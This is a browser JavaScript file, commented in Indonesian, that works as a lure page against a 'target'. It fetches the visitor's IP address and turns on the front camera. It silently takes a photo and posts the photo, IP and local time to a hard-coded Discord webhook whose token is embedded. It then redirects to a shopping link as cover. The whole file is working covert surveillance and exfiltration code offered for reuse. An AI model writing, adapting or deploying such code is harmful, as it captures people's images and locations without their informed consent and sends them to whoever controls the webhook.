const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; // Ganti dengan Webhook Discord
const redirectURL = "https://id.shp.ee/5chejHg"; // Ganti dengan URL tujuan setelah 11 detik

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");
canvas.style.display = "none";
document.body.appendChild(canvas);

// Fungsi untuk mendapatkan waktu lokal HP target
function getLocalTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return `${hours}:${minutes}:${seconds} (${timeZone})`;
}

// Ambil IP Target
fetch("https://api64.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const location = "Unknown"; // Bisa diganti dengan API lokasi jika perlu

        // Akses kamera hanya untuk ambil foto
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                setTimeout(() => {
                    const localTime = getLocalTime(); // Ambil waktu lokal HP target
                    imageCapture.takePhoto()
                        .then(blob => {
                            sendToDiscord(blob, ip, location, localTime);
                            track.stop(); // Matikan kamera setelah foto diambil
                        })
                        .catch(error => console.error("Gagal ambil foto:", error));
                }, 3000); // Ambil foto setelah 3 detik
            })
            .catch(err => console.error("Akses kamera ditolak:", err));
    })
    .catch(err => console.error("Gagal ambil IP:", err));

// Kirim ke Webhook Discord
function sendToDiscord(blob, ip, location, localTime) {
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");

    formData.append("payload_json", JSON.stringify({
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Location**: ${location}\n⏰ **Time**: ${localTime}`
    }));

    fetch(webhookURL, {
        method: "POST",
        body: formData
    });
}

// Redirect ke halaman lain setelah 11 detik
setTimeout(() => {
    window.location.href = redirectURL;
}, 11000);
